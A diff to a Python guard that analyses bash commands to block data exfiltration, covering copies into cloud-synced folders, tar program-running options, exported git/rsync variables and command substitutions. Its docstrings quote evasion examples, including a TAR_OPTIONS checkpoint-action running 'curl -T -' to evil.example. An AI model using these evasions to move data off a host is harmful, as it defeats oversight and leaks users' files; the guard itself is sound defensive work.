@@ -13,6 +13,7 @@ programs. A ``cp`` into a cloud-synced folder is also caught here:
 """
 import os
 import re
+import shlex
 import shutil
 import sys
 
@@ -22,18 +23,21 @@ if __name__ != "__main__" and not __package__:
         sys.path.insert(0, HERE)
 
 from exfil_bash_lex import (_DEFINITION, _DEV_TCP, _NETWORK_WORD, _SUBSTITUTION,
-                             _find_exec, _simple_commands, _strip_heredoc_bodies,
-                             _tokenize, _unwrap, GuardError, owner_repo)
+                             SUBSTITUTION_PLACEHOLDER, _find_exec, _simple_commands,
+                             _split_heredocs, _strip_heredoc_bodies, _tokenize, _unwrap,
+                             GuardError, heredoc_substitutions, is_glob_or_brace,
+                             is_shell_expanded, owner_repo, split_substitutions,
+                             unwrap_with_env)
 from exfil_bash_network import (_scan_code, _scan_shell_script,
                                  PROBE_TOOLS, RAW_SOCKET_TOOLS, SSH_FAMILY,
                                  UPLOAD_TOOLS, _check_probe_tool,
                                  _check_raw_socket_tool, _check_ssh_family,
-                                 _check_upload_tool)
+                                 _check_upload_tool, is_rsync_transport_env)
 from exfil_bash_runner import (INTERPRETERS, MAX_SCRIPT_BYTES, SHELLS,
                                 _check_interpreter, _check_shell,
                                 _check_stdin_program, _follow_cd,
                                 _shell_invocation)
-from exfil_bash_vcs import (_check_gh, _check_git)
+from exfil_bash_vcs import (_check_gh, _check_git, is_repo_selecting_or_transport_env)
 
 
 # Commands past this depth cannot be followed by ``analyze_command`` —
@@ -76,13 +80,483 @@ BLOCKED_SUBCOMMANDS = {
 }
 
 # Folders that sync to a cloud provider: a plain `cp` into one is an upload.
+# The name is matched at a path boundary — ``(?:^|/)NAME(?:/|$)`` — so a
+# trailing-slash-less destination (``~/Dropbox``) or a terminal component
+# (``/home/u/Dropbox``) is caught, while a longer name that merely contains one
+# of these words (``/home/u/Dropbox-backup``, ``/srv/BoxOffice/``) is not.
+# ``Mobile Documents`` keeps its substring match (it is iCloud's container and
+# never a path tail on its own).
+_SYNCED_FOLDER_NAMES = ("Dropbox", "Google Drive", "OneDrive", "CloudStorage",
+                        "Box Sync", "Box", "iCloud")
 SYNCED_FOLDER_PATTERNS = re.compile(
-    r"Mobile Documents|/Dropbox/|/Google Drive/|/OneDrive/|/CloudStorage/|"
-    r"/Box Sync/|/Box/|/iCloud", re.IGNORECASE)
+    r"Mobile Documents|(?:^|/)(?:"
+    + "|".join(re.escape(name) for name in _SYNCED_FOLDER_NAMES)
+    + r")(?:/|$)", re.IGNORECASE)
 COPY_TOOLS = frozenset({"cp", "mv", "rsync", "tee", "dd", "tar", "zip", "ln",
                         "install", "ditto", "cat", "unzip", "gzip", "bzip2", "xz"})
 SYSTEM_PREFIXES = ("/bin/", "/sbin/", "/usr/", "/opt/homebrew/", "/opt/local/",
                    "/Library/", "/System/", "/Applications/", "/nix/")
+
+
+def _is_protected_destination(path):
+    """Whether ``path`` literally names a cloud-synced folder or a mounted volume.
+
+    A cloud-synced folder (matched at a path boundary by ``SYNCED_FOLDER_PATTERNS``)
+    or ``/Volumes`` itself and anything under it is a destination that copying or
+    redirecting into would upload. The ``/Volumes`` test is boundary-safe — it
+    matches the mount root and its children, not an unrelated ``/Volumes-of-x``.
+    """
+    return bool(SYNCED_FOLDER_PATTERNS.search(path)) or (
+        path == "/Volumes" or path.startswith("/Volumes/"))
+
+
+def _points_into_protected(path, cwd):
+    """Whether ``path`` resolves into a protected destination, following symlinks.
+
+    The literal form (``/Volumes/USB/out``) is caught directly; this additionally
+    resolves the existing ancestors of ``path`` with ``realpath`` so a symlink
+    whose target is a cloud-synced folder or mounted volume (``ln -s /Volumes/USB
+    link; cp secret link/out``) is caught too. A computed (``$DEST``) or
+    glob/brace path cannot be resolved and is left to the earlier fail-closed
+    checks (returns ``False`` here). A relative path is joined onto ``cwd``; when
+    ``cwd`` is unknown a relative path cannot be resolved, and an ``OSError``
+    during resolution fails back to ``False`` — the literal check has already run.
+    """
+    if _is_protected_destination(path):
+        return True
+    if is_shell_expanded(path) or is_glob_or_brace(path):
+        return False
+    try:
+        if os.path.isabs(path):
+            base = path
+        elif cwd is not None:
+            base = os.path.join(cwd, path)
+        else:
+            return False
+        resolved = os.path.realpath(base)
+    except OSError:
+        return False
+    return _is_protected_destination(resolved)
+
+
+class _CopyFlags:
+    """The option grammar of one copy tool, as far as the guard needs it to
+    tell destination operands from source operands.
+
+    ``dest_flags`` names the options whose value is a destination (``-t``
+    for cp, ``-O`` for zip). Any option outside the known sets makes the
+    argument shape ambiguous, and the caller then falls back to treating
+    every argument as a possible destination.
+    """
+
+    def __init__(self, bool_short, value_short="", bool_long=(), value_long=(),
+                 dest_flags=()):
+        self.bool_short = bool_short
+        self.value_short = value_short
+        self.bool_long = frozenset(bool_long)
+        self.value_long = frozenset(value_long)
+        self.dest_flags = frozenset(dest_flags)
+
+    def parse(self, args, old_style_bundle=False):
+        """Return ``(positionals, flag_values)`` for ``args``, or ``None``
+        when an option is not one this grammar knows. ``flag_values`` maps
+        each value-taking option seen (``-f`` or ``--file``) to its values.
+        With ``old_style_bundle`` a dashless first argument is a bundle of
+        short options whose values are taken from the following arguments
+        in order (``tar xf a.tar``)."""
+        positionals, values = [], {}
+        i, options_done = 0, False
+        while i < len(args):
+            a = args[i]
+            old_style = False
+            if options_done or a == "-" or not a.startswith("-"):
+                if not (old_style_bundle and i == 0 and a.isalpha()):
+                    positionals.append(a)
+                    i += 1
+                    continue
+                a, old_style = "-" + a, True
+            elif a == "--":
+                options_done = True
+                i += 1
+                continue
+            if a.startswith("--"):
+                name, eq, value = a.partition("=")
+                if name in self.value_long:
+                    if not eq:
+                        i += 1
+                        if i >= len(args):
+                            return None
+                        value = args[i]
+                    values.setdefault(name, []).append(value)
+                elif name not in self.bool_long:
+                    return None
+                i += 1
+                continue
+            letters, pending = a[1:], []
+            for k, ch in enumerate(letters):
+                if ch in self.value_short:
+                    rest = letters[k + 1:]
+                    if rest and not old_style:
+                        values.setdefault("-" + ch, []).append(rest)
+                        break
+                    pending.append("-" + ch)
+                    if not old_style:
+                        break
+                elif ch not in self.bool_short:
+                    return None
+            for flag in pending:
+                i += 1
+                if i >= len(args):
+                    return None
+                values.setdefault(flag, []).append(args[i])
+            i += 1
+        return positionals, values
+
+    def destinations(self, values):
+        """The values of every destination-valued option in ``values``."""
+        return [v for flag in self.dest_flags for v in values.get(flag, [])]
+
+
+_TARGET_DIR = ("-t", "--target-directory")
+_COPY_FLAGS = {
+    "cp": _CopyFlags("aRrHLPfinpvXcxslubdTFZ", "tS",
+                     ("--archive", "--recursive", "--force", "--interactive",
+                      "--no-clobber", "--preserve", "--verbose", "--no-target-directory",
+                      "--parents", "--link", "--symbolic-link", "--update", "--dereference",
+                      "--no-dereference", "--one-file-system", "--remove-destination",
+                      "--sparse", "--backup", "--reflink", "--no-preserve"),
+                     ("--target-directory", "--suffix"), _TARGET_DIR),
+    "mv": _CopyFlags("finvuFhT", "tS",
+                     ("--force", "--interactive", "--no-clobber", "--verbose", "--update",
+                      "--backup", "--no-target-directory", "--strip-trailing-slashes"),
+                     ("--target-directory", "--suffix"), _TARGET_DIR),
+    "ln": _CopyFlags("sfFhinvLPrT", "tS",
+                     ("--symbolic", "--force", "--interactive", "--no-dereference",
+                      "--verbose", "--relative", "--logical", "--physical",
+                      "--no-target-directory", "--backup"),
+                     ("--target-directory", "--suffix"), _TARGET_DIR),
+    "install": _CopyFlags("bCcdpsvMDUT", "gmoftBS",
+                          ("--compare", "--directory", "--preserve-timestamps", "--strip",
+                           "--verbose", "--no-target-directory", "--backup"),
+                          ("--group", "--mode", "--owner", "--target-directory", "--suffix"),
+                          _TARGET_DIR),
+    "ditto": _CopyFlags("vVckxzj", "",
+                        ("--rsrc", "--norsrc", "--extattr", "--noextattr", "--qtn", "--noqtn",
+                         "--acl", "--noacl", "--keepParent", "--sequesterRsrc", "--nocache",
+                         "--hfsCompression", "--nohfsCompression", "--preserveHFSCompression",
+                         "--nopreserveHFSCompression"),
+                        ("--arch", "--bom", "--zlibCompressionLevel")),
+    "rsync": _CopyFlags("avzrlptgoDhPnuciqWxHAXSEmRbKkLOJ0yC8F", "efBTM",
+                        ("--archive", "--verbose", "--compress", "--recursive", "--links",
+                         "--perms", "--times", "--group", "--owner", "--devices", "--specials",
+                         "--human-readable", "--progress", "--partial", "--delete",
+                         "--dry-run", "--update", "--checksum", "--inplace", "--quiet",
+                         "--whole-file", "--hard-links", "--acls", "--xattrs", "--sparse",
+                         "--stats", "--itemize-changes", "--mkpath", "--delete-after",
+                         "--delete-excluded", "--no-perms", "--no-owner", "--no-group",
+                         "--ignore-existing", "--size-only", "--copy-links", "--safe-links",
+                         "--one-file-system", "--remove-source-files"),
+                        ("--exclude", "--include", "--exclude-from", "--include-from",
+                         "--filter", "--rsh", "--rsync-path", "--temp-dir", "--partial-dir",
+                         "--log-file", "--chmod", "--chown", "--bwlimit", "--timeout",
+                         "--backup-dir", "--suffix", "--link-dest", "--compare-dest",
+                         "--copy-dest", "--files-from", "--port", "--password-file",
+                         "--max-size", "--min-size", "--info", "--debug"),
+                        ("-T", "--temp-dir", "--partial-dir", "--log-file", "--backup-dir")),
+    "tee": _CopyFlags("aip", "", ("--append", "--ignore-interrupts", "--output-error")),
+    "zip": _CopyFlags("rqvjDmTyXlLkuFfdSAcz0123456789@egw", "bOn",
+                      ("--recurse-paths", "--quiet", "--verbose", "--junk-paths", "--symlinks",
+                       "--move", "--update", "--freshen", "--test", "--encrypt"),
+                      ("--out", "--temp-path", "--temp-dir", "--suffixes"),
+                      ("-O", "--out", "-b", "--temp-path", "--temp-dir")),
+    "tar": _CopyFlags("xctruAdvzjJpPkmhOSlwWaZBiGMUo", "fCbTXKNVLgHI",
+                      ("--extract", "--get", "--create", "--append", "--update",
+                       "--concatenate", "--catenate", "--delete", "--list", "--diff",
+                       "--compare", "--verbose", "--gzip", "--gunzip", "--bzip2", "--xz",
+                       "--zstd", "--no-same-owner", "--same-owner", "--preserve-permissions",
+                       "--keep-old-files", "--overwrite", "--to-stdout", "--auto-compress",
+                       "--exclude-vcs", "--numeric-owner", "--wildcards", "--absolute-names",
+                       "--dereference", "--one-file-system", "--totals"),
+                      ("--file", "--directory", "--exclude", "--strip-components",
+                       "--transform", "--owner", "--group", "--mode", "--files-from",
+                       "--exclude-from", "--use-compress-program", "--format", "--sort",
+                       "--mtime")),
+}
+_TAR_EXTRACT = frozenset({"x", "--extract", "--get"})
+_TAR_WRITE = frozenset({"c", "r", "u", "A", "--create", "--append", "--update",
+                        "--concatenate", "--catenate", "--delete"})
+_TAR_READ = frozenset({"t", "d", "--list", "--diff", "--compare"})
+
+
+def _tar_destinations(args):
+    """Where a ``tar`` invocation writes: the ``-C`` directory when it
+    extracts, the ``-f`` archive when it creates or appends, nothing when
+    it only lists. ``None`` when the mode cannot be determined."""
+    flags = _COPY_FLAGS["tar"]
+    parsed = flags.parse(args, old_style_bundle=True)
+    if parsed is None:
+        return None
+    _, values = parsed
+    words = set()
+    for i, a in enumerate(args):
+        if a == "--":
+            break
+        if a.startswith("--"):
+            words.add(a.split("=", 1)[0])
+        elif a.startswith("-") or (i == 0 and a.isalpha()):
+            for ch in a.lstrip("-"):
+                if ch in flags.value_short:
+                    break
+                words.add(ch)
+    modes = [m for m in (_TAR_EXTRACT, _TAR_WRITE, _TAR_READ) if words & m]
+    if len(modes) != 1:
+        return None
+    if modes[0] is _TAR_EXTRACT:
+        return values.get("-C", []) + values.get("--directory", [])
+    if modes[0] is _TAR_WRITE:
+        return values.get("-f", []) + values.get("--file", [])
+    return []
+
+
+# The ``tar`` long options whose value is run as an external program: a
+# compression filter the whole archive is piped through, a per-file command,
+# and a checkpoint action (``--checkpoint-action=exec=CMD`` runs CMD during
+# archiving). Any of them can be ``curl -T -`` or another sender.
+_TAR_PROGRAM_OPTIONS = ("--use-compress-program", "--to-command", "--checkpoint-action")
+# ``--checkpoint`` (the frequency, which runs nothing) is a prefix of
+# ``--checkpoint-action`` but must stay allowed, so it is matched exactly and
+# excluded.
+_TAR_PROGRAM_SAFE_EXACT = frozenset({"--checkpoint"})
+
+
+def _is_tar_program_long_option(name):
+    """Whether ``name`` spells, or unambiguously abbreviates, a ``tar`` long
+    option that runs an external program.
+
+    GNU tar resolves any unambiguous prefix of a long option to that option, so
+    ``--use-com``/``--to-c``/``--checkpoint-a`` reach tar as the full dangerous
+    option; matching only the exact spelling let them run the program past the
+    check. A token is refused when it is a prefix of one of the program-running
+    options (``--checkpoint``, which runs nothing, is matched exactly and kept
+    allowed)."""
+    if not name.startswith("--") or len(name) <= 2 or name in _TAR_PROGRAM_SAFE_EXACT:
+        return False
+    return any(option.startswith(name) for option in _TAR_PROGRAM_OPTIONS)
+
+
+def _check_tar_filter(args):
+    """Refuse the ``tar`` options that run an external program as a filter.
+
+    ``--use-compress-program``/``-I`` names a program tar pipes the whole
+    archive through, ``--to-command`` runs one per extracted file, and
+    ``--checkpoint-action=exec=CMD`` runs a command during archiving; any can be
+    ``curl -T -`` (or any sender), streaming archive data to a host the guard
+    never sees while the only operand it inspects is the local archive. The
+    short form is ``-I`` (capital — lowercase ``i`` is ``--ignore-zeros``),
+    which can also appear inside a short-option cluster or an old-style bundle.
+    """
+    for i, a in enumerate(args):
+        if a == "--":
+            break
+        name = a.split("=", 1)[0]
+        if _is_tar_program_long_option(name):
+            raise _GuardError(f"tar {name} runs a program as a filter, which can send the "
+                              f"archive to another host; denied")
+        bundle = None
+        if a.startswith("-") and not a.startswith("--"):
+            bundle = a[1:]
+        elif i == 0 and a.isalpha():
+            bundle = a
+        if bundle and "I" in bundle:
+            raise _GuardError("tar -I/--use-compress-program runs a program as a filter, which "
+                              "can send the archive to another host; denied")
+
+
+def _check_tar_options_value(value):
+    """Hold one ``TAR_OPTIONS`` value to the ``tar`` filter check.
+
+    GNU tar prepends the options in ``$TAR_OPTIONS`` to its command line, so
+    ``TAR_OPTIONS='--checkpoint-action=exec=curl -T - http://evil.example'
+    tar -cf out.tar src`` runs the program-running option while only the
+    archive operand is on the command line — ``_check_tar_filter`` scans argv
+    alone and never sees it. A value the shell computes
+    (``TAR_OPTIONS=$OPTS tar …`` reaches the guard as the literal ``$OPTS``)
+    cannot be read and fails closed; otherwise it is tokenised the way a shell
+    would (failing closed on a value it cannot tokenise) and held to the same
+    check. ``TAR_OPTIONS=--totals`` stays allowed.
+    """
+    if is_shell_expanded(value):
+        raise _GuardError("TAR_OPTIONS is computed at run time; tar prepends it to its options, "
+                          "so a value the guard cannot read does not run")
+    try:
+        options = shlex.split(value)
+    except ValueError:
+        raise _GuardError("TAR_OPTIONS cannot be parsed; tar prepends it to its options, so "
+                          "a value the guard cannot read does not run")
+    _check_tar_filter(options)
+
+
+def _check_tar_options_env(env):
+    """Run any inline ``TAR_OPTIONS`` assignment through ``_check_tar_options_value``."""
+    for name, value in env:
+        if name == "TAR_OPTIONS":
+            _check_tar_options_value(value)
+
+
+def _check_exported_env(args):
+    """Refuse an ``export``/``declare``/``typeset`` of a git repository-selecting
+    or configuration/transport variable.
+
+    Only an *exported* variable reaches a later ``git`` in a separate simple
+    command, so ``export GIT_DIR=/tmp/other.git; git status`` sets it where the
+    leading-assignment capture of the ``git`` command cannot see it. The export
+    is refused at the export itself. An exported ``TAR_OPTIONS`` likewise reaches
+    a later ``tar`` where the tar command's own leading env cannot see it, so its
+    value is run through the same filter check here. A bare ``VAR=value`` (not
+    exported) does not reach the child and is not covered here; ``export
+    EDITOR=vim`` / ``export GIT_PAGER=cat`` stay allowed.
+    """
+    for a in args:
+        if a.startswith("-"):
+            continue
+        name, eq, value = a.partition("=")
+        if eq and name.endswith("+"):
+            name = name[:-1]
+        if is_shell_expanded(name) or is_glob_or_brace(name):
+            raise _GuardError(f"export operand {a!r} names a variable the shell computes or "
+                              f"expands, so the guard cannot tell which variables it sets; write "
+                              f"the name out literally (a value may still contain $, e.g. "
+                              f"export PATH=$PATH:/x)")
+        if is_repo_selecting_or_transport_env(name):
+            raise _GuardError(f"export of {name} points a later git command at another repository "
+                              f"or overrides its configuration or transport; denied")
+        if is_rsync_transport_env(name):
+            raise _GuardError(f"export of {name} sets the remote shell a later rsync runs, which "
+                              f"can route a copy off the host; denied")
+        if name == "TAR_OPTIONS":
+            if eq:
+                _check_tar_options_value(value)
+            else:
+                raise _GuardError("export of TAR_OPTIONS with no value carries a value the guard "
+                                  "cannot read to a later tar, which prepends it to its options; "
+                                  "export it with the value written out literally")
+
+
+def _check_wrapper_env(env):
+    """Refuse a dangerous environment variable handed to a shell or interpreter wrapper.
+
+    ``unwrap_with_env`` captures the leading ``VAR=value`` assignments of a
+    command, but they are consumed only in the ``git`` and ``tar`` branches. A
+    shell or interpreter wrapper (``GIT_DIR=/tmp/other.git sh -c 'git push'``,
+    ``TAR_OPTIONS=… python -c '…'``) re-analyses its nested command without that
+    env, so a repository-selecting or transport git variable — or a
+    program-running ``TAR_OPTIONS`` — would be inherited by the child and reach a
+    later ``git``/``tar`` unchecked. Each captured assignment is held here: a
+    git repository-selecting or transport variable is refused on the name alone,
+    and ``TAR_OPTIONS`` runs through the same tar-filter check. Benign variables
+    (``GIT_PAGER``, unrelated names) stay allowed.
+    """
+    for name, value in env:
+        if is_repo_selecting_or_transport_env(name):
+            raise _GuardError(f"{name} is set for a shell or interpreter that runs another "
+                              f"command, which inherits it and can point git at another "
+                              f"repository or override its configuration or transport; denied")
+        if is_rsync_transport_env(name):
+            raise _GuardError(f"{name} is set for a shell or interpreter that runs another "
+                              f"command, which inherits it and can route an rsync copy off the "
+                              f"host; denied")
+        if name == "TAR_OPTIONS":
+            _check_tar_options_value(value)
+
+
+def _enables_allexport(args):
+    """Whether a ``set`` invocation turns on allexport (``-a`` / ``-o allexport``).
+
+    With allexport on, every subsequent plain ``VAR=value`` assignment is
+    exported, so a later ``GIT_DIR=…`` or ``RSYNC_RSH=…`` reaches a child
+    command the guard's leading-assignment capture never sees. The guard cannot
+    follow that state across the rest of the script, so it fails closed when it
+    is switched on — matching ``set -o allexport`` and a single-dash cluster
+    containing ``a`` (``set -a``, ``set -ea``). ``set +a`` / ``set +o allexport``
+    turn it off and stay allowed.
+    """
+    i = 0
+    while i < len(args):
+        a = args[i]
+        if a == "-o":
+            if i + 1 < len(args) and args[i + 1] == "allexport":
+                return True
+            i += 2
+            continue
+        if a.startswith("-") and not a.startswith("--") and len(a) > 1 and "a" in a[1:]:
+            return True
+        i += 1
+    return False
+
+
+def _copy_destinations(prog, args):
+    """The arguments a copy tool writes to, or ``None`` when its argument
+    shape is ambiguous (an option the guard does not know, or a tool whose
+    operands it does not enumerate) and every argument must be treated as a
+    possible destination.
+
+    Reading from a mounted volume or a cloud-synced folder is not an
+    upload; writing into one is, so only the destination is checked.
+    """
+    if prog == "cat":
+        return []
+    if prog == "dd":
+        return [a[3:] for a in args if a.startswith("of=")]
+    if prog == "tar":
+        return _tar_destinations(args)
+    flags = _COPY_FLAGS.get(prog)
+    if flags is None:
+        return None
+    parsed = flags.parse(args)
+    if parsed is None:
+        return None
+    positionals, values = parsed
+    named = flags.destinations(values)
+    if prog == "tee":
+        return positionals
+    if prog == "zip":
+        return named + positionals[:1]
+    if prog == "rsync":
+        return named + positionals[-1:]
+    if named:
+        return named
+    if prog == "install" and ("d" in "".join(a[1:] for a in args if a.startswith("-")
+                                            and not a.startswith("--"))
+                              or "--directory" in args):
+        return positionals
+    if prog == "ln" and len(positionals) < 2:
+        return []
+    return positionals[-1:]
+
+
+def _check_redirect_targets(targets, cwd):
+    """Hold a command's output-redirection targets to the copy-destination rules.
+
+    A shell redirection (``> f``, ``>> f``, ``&> f``, …) writes the command's
+    output into a file just as a copy tool writes to its destination operand, so
+    ``cat secret > /Volumes/USB/out`` is an upload no differently from
+    ``cp secret /Volumes/USB/out``. The same three tests apply: a computed
+    (``$DEST``) or glob/brace target cannot be checked and fails closed, and a
+    cloud-synced folder or mounted volume — reached directly or through a
+    symlink that resolves into one — is refused.
+    """
+    for target in targets:
+        if is_shell_expanded(target):
+            raise _GuardError(f"a redirection writes to {target!r}, a destination computed at run "
+                              f"time; the guard cannot tell where it points, so write it out "
+                              f"literally")
+        if is_glob_or_brace(target):
+            raise _GuardError(f"a redirection writes to {target!r}, a destination the shell "
+                              f"expands at run time; the guard cannot tell where it points, so "
+                              f"write it out literally")
+        if _points_into_protected(target, cwd):
+            raise _GuardError("a redirection writes into a cloud-synced folder or mounted volume; "
+                              "copying data there is an upload")
 
 
 def _check_program_file(prog_token, ctx, depth):
@@ -138,11 +612,16 @@ def _check_simple_command(argv, piped, heredoc, bodies, ctx, depth, has_substitu
     if raw_first.startswith("$") or _SUBSTITUTION.search(raw_first):
         raise _GuardError(f"command name {raw_first!r} is computed at run time; the guard cannot "
                           f"tell what it runs")
-    argv = _unwrap(argv)
+    argv, env = unwrap_with_env(argv)
     if not argv:
         return ""
     if os.path.basename(argv[0]) == "find":
-        argv = _unwrap(_find_exec(argv))
+        # ``find … -exec env GIT_DIR=… git push \;`` runs its command with its
+        # own leading ``VAR=value`` assignments; unwrap them the same way the
+        # top-level command's env was captured and merge them, so the git/tar
+        # checks downstream see the smuggled environment.
+        argv, inner_env = unwrap_with_env(_find_exec(argv))
+        env = env + inner_env
         if not argv:
             return "find"
     prog = os.path.basename(argv[0])
@@ -152,7 +631,16 @@ def _check_simple_command(argv, piped, heredoc, bodies, ctx, depth, has_substitu
     sensitive = (prog in UPLOAD_TOOLS or prog in SSH_FAMILY or prog in RAW_SOCKET_TOOLS
                  or prog in PROBE_TOOLS or prog in INTERPRETERS or prog in SHELLS
                  or prog in ("git", "gh") or prog in BLOCKED_SUBCOMMANDS)
-    if sensitive and has_substitution:
+    # A substitution the local shell performs anywhere on the line can feed
+    # a sensitive program, through its arguments or through a variable. One
+    # the local shell leaves as text (inside single quotes) cannot — unless
+    # the program itself hands its arguments to a shell or runs them as
+    # code, as ssh's remote command, `bash -c` and an interpreter's inline
+    # program do, where the text is evaluated after all.
+    evaluates_arguments = prog in SSH_FAMILY or prog in SHELLS or prog in INTERPRETERS
+    carries_substitution = evaluates_arguments and any(
+        _SUBSTITUTION.search(a) or SUBSTITUTION_PLACEHOLDER in a for a in argv[1:])
+    if sensitive and (has_substitution or carries_substitution):
         raise _GuardError(f"{prog} appears in a command line that uses command substitution "
                           f"($(...), backticks or process substitution) — even inside a quoted "
                           f"remote command or argument; what it expands to cannot be verified, so "
@@ -163,10 +651,42 @@ def _check_simple_command(argv, piped, heredoc, bodies, ctx, depth, has_substitu
     if prog in BLOCKED_SUBCOMMANDS and any(a in BLOCKED_SUBCOMMANDS[prog] for a in argv[1:]):
         raise _GuardError(f"{prog} {' '.join(a for a in argv[1:] if a in BLOCKED_SUBCOMMANDS[prog])} "
                           f"publishes or uploads; denied")
-    if prog in COPY_TOOLS and any(SYNCED_FOLDER_PATTERNS.search(a) or a.startswith("/Volumes/")
-                                  for a in argv[1:]):
-        raise _GuardError(f"{prog} touches a cloud-synced folder or mounted volume; copying data "
-                          f"there is an upload")
+    if prog == "set" and _enables_allexport(argv[1:]):
+        raise _GuardError("set -a / set -o allexport exports every later assignment, so a "
+                          "subsequent GIT_DIR=… or RSYNC_RSH=… would reach a child command the "
+                          "guard never inspects; denied (set +a stays allowed)")
+    if prog in ("export", "declare", "typeset"):
+        _check_exported_env(argv[1:])
+    if (prog in SHELLS or prog in INTERPRETERS) and env:
+        _check_wrapper_env(env)
+    if prog in COPY_TOOLS:
+        if prog == "tar":
+            _check_tar_filter(argv[1:])
+            _check_tar_options_env(env)
+        if prog == "rsync":
+            for name, _value in env:
+                if is_rsync_transport_env(name):
+                    raise _GuardError(f"rsync with {name} set runs an arbitrary remote shell, "
+                                      f"which can route the copy off the host; denied")
+        destinations = _copy_destinations(prog, argv[1:])
+        # When the destination cannot be identified — an option the guard does
+        # not know, or a tool whose operands it does not enumerate (gzip, xz,
+        # unzip, …) — every argument is a possible destination and is checked
+        # as one, so a computed path does not slip through the None fallback.
+        suspects = argv[1:] if destinations is None else destinations
+        computed = [a for a in suspects if is_shell_expanded(a)]
+        if computed:
+            raise _GuardError(f"{prog} writes to {computed[0]!r}, a destination computed at run "
+                              f"time; the guard cannot tell where it points, so write it out "
+                              f"literally")
+        globbed = [a for a in suspects if is_glob_or_brace(a)]
+        if globbed:
+            raise _GuardError(f"{prog} writes to {globbed[0]!r}, a destination the shell expands "
+                              f"at run time; the guard cannot tell where it points, so write it "
+                              f"out literally")
+        if any(_points_into_protected(a, ctx.command_cwd) for a in suspects):
+            raise _GuardError(f"{prog} writes into a cloud-synced folder or mounted volume; "
+                              f"copying data there is an upload")
     if prog in UPLOAD_TOOLS:
         return _check_upload_tool(prog, argv, piped, ctx)
     if prog in SSH_FAMILY:
@@ -182,7 +702,7 @@ def _check_simple_command(argv, piped, heredoc, bodies, ctx, depth, has_substitu
         return _check_interpreter(prog, argv, piped, bodies if heredoc or bodies else [],
                                    ctx, depth, analyze_command)
     if prog == "git":
-        return _check_git(argv, ctx)
+        return _check_git(argv, ctx, env)
     if prog == "gh":
         return _check_gh(argv, ctx)
     scanned = _check_program_file(argv[0], ctx, depth)
@@ -198,33 +718,79 @@ def analyze_command(command, ctx, depth=0):
     for m in _DEV_TCP.finditer(command):
         if not ctx.allowlist.is_lab_host(m.group(1)):
             return f"/dev/tcp redirection to {m.group(1)!r}, which is not an allowlisted lab host"
-    stripped, bodies = _strip_heredoc_bodies(command)
+    stripped, heredocs = _split_heredocs(command)
+    bodies = [body for body, _ in heredocs]
+    # Comments and line continuations come out, and every substitution the
+    # shell performs is replaced by a placeholder and kept aside: what runs
+    # inside one is a command like any other and is analyzed as one below.
+    try:
+        masked, substitutions = split_substitutions(stripped)
+    except GuardError as exc:
+        return str(exc)
+    # Continuations are joined only now, so a /dev/tcp path split across
+    # lines is checked again as the shell will see it.
+    for m in _DEV_TCP.finditer(masked):
+        if not ctx.allowlist.is_lab_host(m.group(1)):
+            return f"/dev/tcp redirection to {m.group(1)!r}, which is not an allowlisted lab host"
+    for body, expands in heredocs:
+        if expands:
+            try:
+                substitutions += heredoc_substitutions(body)
+            except GuardError as exc:
+                return str(exc)
     # shlex treats a newline as whitespace, but in a shell it ends the
-    # command. A backslash-newline continuation is joined first so a
-    # command split across lines stays one command.
-    stripped = re.sub(r"\\\n", " ", stripped).replace("\n", " ; ")
-    tokens = _tokenize(stripped)
+    # command.
+    masked = masked.replace("\n", " ; ")
+    tokens = _tokenize(masked)
     if tokens is None:
         return "the command's quoting cannot be parsed; an unreadable command does not run"
-    if _DEFINITION.search(stripped) and (_NETWORK_WORD.search(stripped) or any(
+    if _DEFINITION.search(masked) and (_NETWORK_WORD.search(stripped) or any(
             os.path.basename(t) in ALWAYS_BLOCKED for t in tokens)):
         return "alias/function definition alongside a network tool; indirection is denied"
     commands = _simple_commands(tokens)
-    has_substitution = bool(_SUBSTITUTION.search(stripped))
+    has_substitution = bool(substitutions)
     # A `cd` earlier in the same command line changes where relative paths
     # resolve for everything after it, so the effective directory is
     # tracked through the list. A target that cannot be known statically
     # leaves it None, and anything that then needs it fails closed.
+    # A subshell's `cd` ends with the subshell, so the directory in force
+    # when each `( … )` group opened is restored when it closes — including
+    # when the next command is already inside a sibling group.
     cwd = ctx.command_cwd
+    open_groups = []
     try:
-        for argv, piped, heredoc in commands:
-            if argv and os.path.basename(argv[0]) in ("cd", "pushd"):
+        for argv, piped, heredoc, subshells, redirects in commands:
+            shared = 0
+            while (shared < len(open_groups) and shared < len(subshells)
+                   and open_groups[shared][0] == subshells[shared]):
+                shared += 1
+            while len(open_groups) > shared:
+                cwd = open_groups.pop()[1]
+            for group in subshells[shared:]:
+                open_groups.append((group, cwd))
+            _check_redirect_targets(redirects, cwd)
+            if not argv:
+                # A redirection-only command (`> /Volumes/USB/out`): its target
+                # has just been checked and there is no program to dispatch.
+                continue
+            if os.path.basename(argv[0]) in ("cd", "pushd"):
                 cwd = _follow_cd(argv, cwd)
                 continue
             _check_simple_command(argv, piped, heredoc, bodies, ctx.at(cwd), depth,
                                   has_substitution, analyze_command)
     except _GuardError as exc:
         return str(exc)
+    # A substitution runs in whatever directory the line had reached by
+    # then, which is not tracked per substitution: once the line changes
+    # directory, its substitutions are analyzed with the directory unknown,
+    # so anything that depends on it fails closed.
+    changes_directory = any(argv and os.path.basename(argv[0]) in ("cd", "pushd")
+                            for argv, _, _, _, _ in commands)
+    body_ctx = ctx.at(None) if changes_directory else ctx
+    for body in substitutions:
+        reason = analyze_command(body, body_ctx, depth + 1)
+        if reason:
+            return f"inside a command substitution: {reason}"
     return ""
 
 
@@ -233,7 +799,7 @@ def bash_targets(command, ctx):
     stripped, _ = _strip_heredoc_bodies(command)
     tokens = _tokenize(stripped) or []
     names = []
-    for argv, _, _ in _simple_commands(tokens):
+    for argv, _, _, _, _ in _simple_commands(tokens):
         unwrapped = _unwrap(argv)
         if unwrapped:
             names.append(os.path.basename(unwrapped[0]))
